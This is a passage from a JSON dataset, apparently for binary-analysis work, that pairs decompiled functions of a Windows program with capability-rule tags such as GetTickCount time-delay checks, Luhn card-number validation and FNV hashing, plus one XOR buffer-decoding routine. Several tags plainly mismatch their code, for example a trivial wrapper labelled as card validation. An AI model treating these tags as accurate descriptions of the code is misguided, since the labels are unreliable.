= fcn.14002c080(0x140108a30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113660, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113680, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 2171
    },
    "1400b9c7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9c70(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 1714
    },
    "1400b9cd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9cd0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401135b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113640, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113660, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113680, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 1559
    },
    "14000153": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.140001530(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    ulong arg1_00;\n    ulong uStackX16;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_bp_30h;\n    ulong var_38h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    uStackX16 = arg2;\n    var_20h = arg3;\n    var_28h = arg4;\n    arg1_00 = (**0x140106580)(1);\n    uVar1 = fcn.140015a50(arg1_00, arg1, &uStackX16);\n    return uVar1;\n}\n",
        "token_count": 181
    },
    "14000159": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140001590(int64_t arg1, int64_t arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    return *(arg2 + 0x14) + (arg1 - *(arg2 + 0xc));\n}\n",
        "token_count": 63
    },
    "1400015b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.1400015bd(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4, ulong arg_30h, ulong arg_38h)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    ulong var_10h;\n    ulong var_18h;\n    ulong var_20h;\n    ulong var_28h;\n    ulong s1;\n    ulong s2;\n    ulong var_28h_2;\n    ulong var_20h_2;\n    ulong var_18h_2;\n    uint64_t var_10h_2;\n    ulong var_4h;\n    \n    iVar2 = fcn.140001590(*(arg2 + 0x20) + arg3, arg_30h);\n    iVar3 = fcn.140001590(*(arg2 + 0x1c) + arg3, arg_30h);\n    var_4h._0_4_ = 0;\n    for (var_10h_2 = 0; var_10h_2 < *(arg2 + 0x18); var_10h_2 = var_10h_2 + 1) {\n        uVar4 = fcn.140001590(*(iVar2 + var_10h_2 * 4) + arg3, arg_30h);\n        uVar5 = fcn.140001590(*(iVar3 + (var_10h_2 + 1) * 4) + arg3, arg4);\n        uVar6 = fcn.14002fa60(arg1);\n        iVar1 = sub.msvcrt.dll_strcmp(uVar4, uVar6);\n        if (iVar1 == 0) {\n            sub.msvcrt.dll_memcpy(arg_38h, uVar5, 0x17);\n            var_4h._0_4_ = 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 471
    },
    "14000189": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.140001899(int64_t arg1)\n\n{\n    uint8_t *puVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    ulong var_20h;\n    uchar auStack168 [16];\n    ulong var_90h;\n    uint8_t auStack136 [16];\n    ulong var_70h;\n    char cStack87;\n    uchar uStack77;\n    int32_t iStack76;\n    uint8_t *puStack72;\n    uchar auStack64 [3];\n    uint8_t *var_35h;\n    uint8_t *var_28h;\n    ulong var_20h_2;\n    ulong var_18h;\n    ulong var_4h;\n    \n    fcn.1400a99a0(auStack168);\n    fcn.1400016f8(auStack136, &uStack77);\n    unique0x00003100 = auStack136;\n    if (cStack87 != '\\0') {\n        for (iStack76 = 0; puStack72 = unique0x00003100,  _auStack64 = unique0x00003100,  iStack76 < 0x32;\n            iStack76 = iStack76 + 1) {\n            unique0x00003100[iStack76] = unique0x00003100[iStack76] ^ iStack76 + (iStack76 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    var_28h = unique0x00003100;\n    fcn.1400aa3f0(auStack168, auStack136);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < *0x140106428; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        var_18h._3_1_ = *(arg1 + var_18h._4_4_);\n        var_20h_2._4_4_ = 0;\n        while( true ) {\n            uVar3 = var_20h_2._4_4_;\n            uVar2 = fcn.14002fc40(auStack168);\n            if (uVar2 <= uVar3) break;\n            puVar1 = fcn.1400aa4b0(auStack168, var_20h_2._4_4_);\n            var_18h._3_1_ = var_18h._3_1_ ^ *puVar1;\n            var_20h_2._4_4_ = var_20h_2._4_4_ + 1;\n        }\n        *(*0x140136040 + var_18h._4_4_) = var_18h._3_1_;\n    }\n    fcn.1400a7ad0(auStack168);\n    fcn.1400aa2e0(auStack168);\n    return 0;\n}\n",
        "token_count": 685
    },
    "14000a5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000a5d4(void)\n\n{\n    fcn.1400b3190(0x1401360d0);\n    return;\n}\n",
        "token_count": 36
    },
    "14000a64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000a64a(void)\n\n{\n    fcn.14000a5f2(1, 0xffff);\n    return;\n}\n",
        "token_count": 34
    },
    "14000a91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000a707)\n\nuint32_t * fcn.14000a910(int64_t arg1, uint32_t *arg2)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    cVar1 = **(arg1 + 0x18);\n    if ((cVar1 != 'R') && (cVar1 != 'O')) {\n        return arg2;\n    }\n    uVar5 = 0x20;\n    iVar4 = *(arg1 + 0x48) + 3;\n    if (cVar1 == 'R') {\n        iVar4 = *(arg1 + 0x48) + 2;\n        uVar5 = 0x1f;\n    }\n    *(arg1 + 0x48) = iVar4;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    if (uVar5 < 0x32) {\n        if (0x28 < uVar5) {\n            switch(uVar5) {\n            case 0x29:\n            case 0x2e:\n            case 0x2f:\n                goto code_r0x00014000a6a8;\n            default:\n                return NULL;\n            case 0x30:\n                goto code_r0x00014000a69e;\n            }\n        }\n        uVar2 = 1 << uVar5;\n        if ((uVar2 & 0x17c00fff600) == 0) {\n            uVar2 = uVar2 & 0x1fe000000;\n            goto joined_r0x00014000a703;\n        }\n    }\n    else {\n        if (0x1d < uVar5 - 0x34) {\n            return NULL;\n        }\n        uVar2 = 1 << (uVar5 - 0x34 & 0x3f);\n        if ((uVar2 & 0x1c71107) == 0) {\n            if ((uVar2 & 0xa002ef8) != 0) {\n                return NULL;\n            }\n            uVar2 = uVar2 & 0x34000000;\njoined_r0x00014000a703:\n            if (uVar2 == 0) {\n                return NULL;\n            }\n            goto code_r0x00014000a6a8;\n        }\n    }\ncode_r0x00014000a69e:\n    if (arg2 == NULL) {\n        return NULL;\n    }\ncode_r0x00014000a6a8:\n    iVar4 = *(arg1 + 0x28);\n    if (*(arg1 + 0x2c) <= iVar4) {\n        return NULL;\n    }\n    puVar3 = iVar4 * 0x20 + *(arg1 + 0x20);\n    *(puVar3 + 1) = 0;\n    *(arg1 + 0x28) = iVar4 + 1;\n    *puVar3 = uVar5;\n    *(puVar3 + 4) = arg2;\n    *(puVar3 + 6) = 0;\n    return puVar3;\n}\n",
        "token_count": 722
    },
    "14000abc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000abc0(ulong arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    fcn.140015b00(arg1, 0x14010c2ac, &uStackX24);\n    return;\n}\n",
        "token_count": 92
    },
    "14000bf7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000bf70(int64_t arg1)\n\n{\n    ulong uVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    \n    if ((*(arg1 + 0x12) & 4) == 0) {\n        uVar2 = *(arg1 + 0x58);\n        if (0x800 < uVar2) {\n            return 0;\n        }\n        pcVar3 = *(arg1 + 0x18);\n        *(arg1 + 0x58) = uVar2 + 1;\n        uVar1 = 0;\n        if (*pcVar3 != 'F') goto code_r0x00014000bf9a;\n    }\n    else {\n        pcVar3 = *(arg1 + 0x18);\n        if (*pcVar3 != 'F') {\n            return 0;\n        }\n    }\n    *(arg1 + 0x18) = pcVar3 + 1;\n    if (pcVar3[1] == 'Y') {\n        *(arg1 + 0x18) = pcVar3 + 2;\n    }\n    uVar1 = fcn.14000bef0(arg1, 1);\n    uVar1 = fcn.14000a910(arg1, uVar1);\n    if (**(arg1 + 0x18) == 'E') {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    if ((*(arg1 + 0x12) & 4) != 0) {\n        return uVar1;\n    }\n    uVar2 = *(arg1 + 0x58) - 1;\ncode_r0x00014000bf9a:\n    *(arg1 + 0x58) = uVar2;\n    return uVar1;\n}\n",
        "token_count": 418
    },
    "140011d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140011d80(uchar *arg1, ulong noname_1, int64_t arg3, int64_t *arg4)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    \n    piVar1 = arg4;\n    if (arg4 != NULL) {\n        do {\n            if (*(piVar1 + 2) != 0) break;\n            if (*piVar1[1] < 0x2c) {\n                uVar4 = 1 << (*piVar1[1] & 0x3f);\n                if ((uVar4 & 0x8620e000000) == 0) {\n                    if ((uVar4 & 0x1c00000000) == 0) goto code_r0x000140011ddd;\n                    uVar3 = arg1[0x108];\n                    if ((uVar3 & 0xfd) != 0x28) goto code_r0x000140011ea7;\n                    iVar6 = *(arg1 + 0x100);\n                    if (iVar6 != 0xff) goto code_r0x000140011ec3;\ncode_r0x000140011faf:\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar5 = 1;\n                    iVar6 = 0;\n                }\n                else {\n                    uVar3 = arg1[0x108];\ncode_r0x000140011ea7:\n                    iVar5 = *(arg1 + 0x100);\n                    iVar6 = iVar5;\n                    if (uVar3 == 0x20) {\ncode_r0x000140011eb7:\n                        if (iVar6 == 0xff) goto code_r0x000140011faf;\n                    }\n                    else {\n                        if (iVar5 != 0xff) {\n                            iVar6 = iVar5 + 1;\n                            *(arg1 + 0x100) = iVar6;\n                            arg1[iVar5] = 0x20;\n                            arg1[0x108] = 0x20;\n                            goto code_r0x000140011eb7;\n                        }\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *arg1 = 0x20;\n                        iVar6 = 1;\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    }\ncode_r0x000140011ec3:\n                    iVar5 = iVar6 + 1;\n                }\n                *(arg1 + 0x100) = iVar5;\n                arg1[iVar6] = 0x28;\n                uVar7 = *(arg1 + 0x128);\n                arg1[0x108] = 0x28;\n                *(arg1 + 0x128) = 0;\n                fcn.1400120a0(arg1, 0x11, arg4, 0);\n                iVar6 = *(arg1 + 0x100);\n                if (iVar6 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *arg1 = 0x29;\n                    iVar5 = 1;\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    goto code_r0x000140011e21;\n                }\n                iVar5 = iVar6 + 1;\n                *(arg1 + 0x100) = iVar5;\n                arg1[iVar6] = 0x29;\n                arg1[0x108] = 0x29;\n                goto joined_r0x000140011f2e;\n            }\ncode_r0x000140011ddd:\n            piVar1 = *piVar1;\n        } while (piVar1 != NULL);\n    }\n    uVar7 = *(arg1 + 0x128);\n    *(arg1 + 0x128) = 0;\n    fcn.1400120a0(arg1, 0x11, arg4, 0);\n    iVar5 = *(arg1 + 0x100);\njoined_r0x000140011f2e:\n    if (iVar5 == 0xff) {\n        arg1[0xff] = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *arg1 = 0x28;\n        arg1[0x108] = 0x28;\n        iVar6 = *(arg3 + 0x18);\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n        *(arg1 + 0x100) = 1;\n        if (iVar6 != 0) goto code_r0x000140011e40;\n        iVar2 = 1;\n    }\n    else {\ncode_r0x000140011e21:\n        iVar2 = iVar5 + 1;\n        *(arg1 + 0x100) = iVar2;\n        arg1[iVar5] = 0x28;\n        arg1[0x108] = 0x28;\n        iVar6 = *(arg3 + 0x18);\n        if (iVar6 != 0) {\ncode_r0x000140011e40:\n            fcn.1400113f0(arg1, 0x11, iVar6);\n            iVar2 = *(arg1 + 0x100);\n        }\n        if (iVar2 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar6 = 1;\n            iVar2 = 0;\n            goto code_r0x000140011e64;\n        }\n    }\n    iVar6 = iVar2 + 1;\ncode_r0x000140011e64:\n    *(arg1 + 0x100) = iVar6;\n    arg1[iVar2] = 0x29;\n    arg1[0x108] = 0x29;\n    fcn.1400120a0(arg1, 0x11, arg4, 1);\n    *(arg1 + 0x128) = uVar7;\n    return;\n}\n",
        "token_count": 1514
    },
    "14001242": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140012420(ushort *arg1, ulong noname_1, int64_t arg3, int64_t *arg4)\n\n{\n    uchar uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar *puVar5;\n    \n    piVar2 = arg4;\n    if (arg4 != NULL) {\ncode_r0x000140012454:\n        if (*(piVar2 + 2) != 0) goto code_r0x000140012448;\n        if (*piVar2[1] != 0x2a) {\n            puVar5 = 0x14010cc1c;\n            iVar4 = *(arg1 + 0x80);\n            do {\n                uVar1 = *puVar5;\n                if (iVar4 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n                    *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\n                    iVar3 = 1;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar3 = iVar4 + 1;\n                }\n                puVar5 = puVar5 + 1;\n                *(arg1 + 0x80) = iVar3;\n                *(arg1 + iVar4) = uVar1;\n                *(arg1 + 0x84) = uVar1;\n                iVar4 = iVar3;\n            } while (puVar5 != 0x14010cc1e);\n            fcn.1400120a0(arg1, 0x11, arg4, 0);\n            iVar4 = *(arg1 + 0x80);\n            if (iVar4 != 0xff) {\n                iVar3 = iVar4 + 1;\n                *(arg1 + 0x80) = iVar3;\n                *(arg1 + iVar4) = 0x29;\n                *(arg1 + 0x84) = 0x29;\n                goto joined_r0x000140012677;\n            }\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n            iVar4 = 2;\n            *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\n            *arg1 = 0x2029;\n            goto code_r0x00014001248f;\n        }\n        fcn.1400120a0(arg1, 0x11, arg4, 0);\n        iVar4 = *(arg1 + 0x80);\n        goto joined_r0x000140012489;\n    }\ncode_r0x00014001250b:\n    iVar3 = *(arg1 + 0x80);\njoined_r0x000140012677:\n    if (iVar3 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n        *arg1 = 0x20;\n        iVar4 = 1;\n        *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\ncode_r0x00014001248f:\n        iVar3 = iVar4 + 1;\n        *(arg1 + 0x80) = iVar3;\n        *(arg1 + iVar4) = 0x5b;\n        *(arg1 + 0x84) = 0x5b;\n        iVar4 = *(arg3 + 0x10);\n        if (iVar4 != 0) {\ncode_r0x0001400124ae:\n            fcn.1400113f0(arg1, 0x11, iVar4);\n            iVar3 = *(arg1 + 0x80);\n        }\n        if (iVar3 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n            *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\n            iVar4 = 1;\n            iVar3 = 0;\n            goto code_r0x0001400124d2;\n        }\n    }\n    else {\n        iVar4 = iVar3 + 1;\n        *(arg1 + 0x80) = iVar4;\n        *(arg1 + iVar3) = 0x20;\n        *(arg1 + 0x84) = 0x20;\njoined_r0x000140012489:\n        if (iVar4 != 0xff) goto code_r0x00014001248f;\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x88))(arg1, 0xff, *(arg1 + 0x8c));\n        *arg1 = 0x5b;\n        *(arg1 + 0x84) = 0x5b;\n        iVar4 = *(arg3 + 0x10);\n        *(arg1 + 0xa0) = *(arg1 + 0xa0) + 1;\n        *(arg1 + 0x80) = 1;\n        if (iVar4 != 0) goto code_r0x0001400124ae;\n        iVar3 = 1;\n    }\n    iVar4 = iVar3 + 1;\ncode_r0x0001400124d2:\n    *(arg1 + 0x80) = iVar4;\n    *(arg1 + iVar3) = 0x5d;\n    *(arg1 + 0x84) = 0x5d;\n    return;\ncode_r0x000140012448:\n    piVar2 = *piVar2;\n    if (piVar2 == NULL) goto code_r0x0001400124f8;\n    goto code_r0x000140012454;\ncode_r0x0001400124f8:\n    fcn.1400120a0(arg1, 0x11, arg4, 